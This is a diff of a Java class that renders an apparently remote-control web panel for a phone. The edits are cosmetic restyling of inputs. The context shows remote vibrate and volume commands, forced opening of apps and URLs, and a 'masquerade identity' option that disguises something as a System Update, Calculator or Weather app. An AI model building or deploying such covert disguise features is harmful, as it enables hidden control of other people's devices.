@@ -145,7 +145,7 @@ public class TerminalModule extends BaseModule {
         html.append("<div style=\"margin-bottom: 25px;\">");
         html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green); font-size: 0.7rem;\">DEVICE_SOUND_SETTING</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
-        html.append("<select id=\"device-cmd-selector\" style=\"background: #000; border: 1px solid var(--neon-green); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
+        html.append("<select id=\"device-cmd-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-green); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<option value=\"vibrate\">VIBRATE_DEVICE</option>");
         html.append("<option value=\"max-volume\">MAXIMIZE_VOLUME</option>");
         html.append("<option value=\"silent-mode\">SILENT_MODE</option>");
@@ -157,7 +157,7 @@ public class TerminalModule extends BaseModule {
         html.append("<div style=\"margin-bottom: 25px;\">");
         html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_APP</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
-        html.append("<select id=\"app-selector\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
+        html.append("<select id=\"app-selector\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<option value=\"\" style=\"background:#000;\">Select App...</option>");
         for (FirebaseConfig.AppEntry app : server.getLaunchableAppsProxy()) {
             html.append("<option value=\"").append(app.packageName).append("\">").append(escapeHtml(app.name)).append("</option>");
@@ -170,7 +170,7 @@ public class TerminalModule extends BaseModule {
         html.append("<div style=\"margin-bottom: 25px;\">");
         html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_URL</div>");
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
-        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
+        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<button onclick=\"openUrl()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
         html.append("</div></div>");
         html.append("</div>"); // Close DEVICE_COMMANDS card
@@ -181,7 +181,7 @@ public class TerminalModule extends BaseModule {
         
         html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: flex-start;\">");
         html.append("<label class=\"info-label\" style=\"align-self: flex-start; font-size: 0.9rem;\">MASQUERADE_IDENTITY:</label>");
-        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
+        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
         html.append("<option value=\"update\">System Update (Status Gear)</option>");
         html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
         html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
@@ -202,7 +202,7 @@ public class TerminalModule extends BaseModule {
         html.append("<div style=\"display: flex; flex-direction: column; align-items: flex-start;\">");
         html.append("<div style=\"width: 100%; max-width: 660px;\">");
         html.append("<form action=\"/settings/password\" method=\"POST\" class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 10px;\">");
-        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER_NEW_KEY\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
+        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER_NEW_KEY\" style=\"background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
         html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px; font-size: 0.7rem; width: 210px !important; text-align: center; margin: 0;\">UPDATE_KEY</button>");
         html.append("</form></div></div></div>");
 
